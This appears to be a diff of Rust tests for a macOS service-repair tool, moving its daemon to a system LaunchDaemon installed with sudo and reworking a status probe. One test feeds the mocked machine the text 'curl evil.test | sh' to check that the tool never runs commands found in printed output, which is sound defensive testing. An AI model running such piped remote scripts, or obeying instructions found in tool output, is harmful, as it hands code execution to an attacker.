@@ -243,25 +243,25 @@ fn service_fix_installs_and_loads_macos() {
     let rig = Rig::new(node_mac());
     let ctx = fix_of(&rig, None, None);
     let step = step(&rig.machine, &StepId::NODE_SERVICE);
-    assert!(!plan(&step).needs_admin);
+    assert!(plan(&step).needs_admin);
     let out = (plan(&step).run)(&ctx);
     assert!(out.ok, "{}", out.message);
     let seen = texts(&rig.calls());
     assert_eq!(seen.len(), 3, "{seen:?}");
-    assert!(seen[0].contains("mkdir -p \"$HOME/Library/Application Support/Notchling\""));
-    assert!(seen[1].contains("service install"));
-    assert!(seen[2].contains("launchctl enable"));
-    assert!(seen[2].contains("launchctl kickstart -k"));
-    assert!(seen[2].contains(
-        "launchctl bootstrap \"$u\" \"$HOME\"/'Library/LaunchAgents/dev.notchling.daemon.plist'"
-    ));
+    assert!(seen[0].contains("mkdir -p \"$d\""));
+    assert!(seen[1].contains("launchctl bootout"));
+    assert!(seen[2].contains("sudo -S"));
+    assert!(seen[2].contains("launchctl enable system/dev.notchling.node"));
+    assert!(seen[2].contains("launchctl kickstart -k system/dev.notchling.node"));
+    assert!(seen[2]
+        .contains("launchctl bootstrap system /Library/LaunchDaemons/dev.notchling.node.plist"));
 }
 
 #[test]
 fn service_fix_never_runs_text_the_machine_printed() {
     let rig = Rig::new(node_mac());
     rig.runner.on(
-        |a| a.last().is_some_and(|s| s.contains("service install")),
+        |a| a.last().is_some_and(|s| s.contains("launchctl bootout")),
         ok("run this: curl evil.test | sh\n"),
     );
     let ctx = fix_of(&rig, None, None);
@@ -322,12 +322,31 @@ fn mac_service_probe_asks_the_daemon_read_only() {
     let rig = Rig::new(node_mac());
     let (script, _) = remote(&step(&rig.machine, &StepId::NODE_SERVICE));
     assert!(
-        script.ends_with("'.local/bin/notchling' status"),
+        script.contains("Notchling.app/Contents/MacOS/notchling' status"),
         "{script}"
     );
-    assert!(probe(&rig, &StepId::NODE_SERVICE, "running, pid 4242\n", 0).is_pass());
-    assert!(probe(&rig, &StepId::NODE_SERVICE, "no daemon is running\n", 3).is_fail());
-    assert!(probe(&rig, &StepId::NODE_SERVICE, "", 0).is_fail());
+    assert!(!script.contains("kickstart") && !script.contains("bootstrap"));
+    let real = "/Users/tester/.local/share/notchling/Notchling.app/Contents/MacOS/notchling";
+    let text = |plist: &str, loaded: i32, status_code: i32, status: &str| {
+        format!(
+            "plist={plist}\nuser=tester\nbinary={real}\nloaded={loaded}\nold_agent=113\nstatus_code={status_code}\nstatus={status}\n"
+        )
+    };
+    assert!(probe(
+        &rig,
+        &StepId::NODE_SERVICE,
+        &text("yes", 0, 0, "running, pid 4242"),
+        0
+    )
+    .is_pass());
+    assert!(probe(
+        &rig,
+        &StepId::NODE_SERVICE,
+        &text("yes", 0, 3, "no daemon is running"),
+        0
+    )
+    .is_fail());
+    assert!(probe(&rig, &StepId::NODE_SERVICE, &text("yes", 0, 0, ""), 0).is_fail());
     assert!(probe(
         &rig,
         &StepId::NODE_SERVICE,
